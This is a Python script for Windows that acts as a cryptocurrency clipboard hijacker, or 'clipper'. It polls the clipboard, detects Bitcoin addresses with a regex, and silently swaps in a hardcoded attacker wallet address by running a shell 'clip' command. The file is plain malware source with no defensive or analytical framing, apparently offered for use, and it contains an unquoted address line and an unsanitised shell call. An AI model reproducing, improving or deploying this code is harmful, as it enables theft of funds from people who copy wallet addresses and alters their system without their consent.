from time import sleep
import subprocess
import ctypes
import re
import os

BtcAddy = bc1qum3z5xx9kvc5t27zajg63jx4gweclktwm7kmgq

class Clipboard:
    def __init__(self):
        self.kernel32 = ctypes.windll.kernel32
        self.kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
        self.kernel32.GlobalLock.restype = ctypes.c_void_p
        self.kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]
        self.user32 = ctypes.windll.user32
        self.user32.GetClipboardData.restype = ctypes.c_void_p
    
    def __enter__(self):
        self.user32.OpenClipboard(0)
        if self.user32.IsClipboardFormatAvailable(1):
            data  = self.user32.GetClipboardData(1)
            data_locked = self.kernel32.GlobalLock(data)
            text = ctypes.c_char_p(data_locked)
            value = text.value
            self.kernel32.GlobalUnlock(data_locked)
            
            try:
                return value.decode()
            
            except Exception as e:
                return ''

    def __exit__(self, exc_type, exc_value, exc_traceback):
        self.user32.CloseClipboard()

class Methods:
    regex = '^(bc1|[13])[a-zA-HJ-NP-Z0-9]+'

    @staticmethod
    def set_clipboard(text):
        return subprocess.check_call('echo %s |clip' % text.strip() , shell=True)
    
    def check(self, text):
        try:
            regex_check = re.findall(self.regex, text)
            if regex_check:
                return True

        except Exception as e:
            return False

def start():
    m = Methods()
    while True:
        with Clipboard() as clipboard:
            sleep(0.1)
            target_clipboard = clipboard
        if m.check(target_clipboard):
            m.set_clipboard(BtcAddy)         
        sleep(1)

if __name__ == "__main__":
    start()
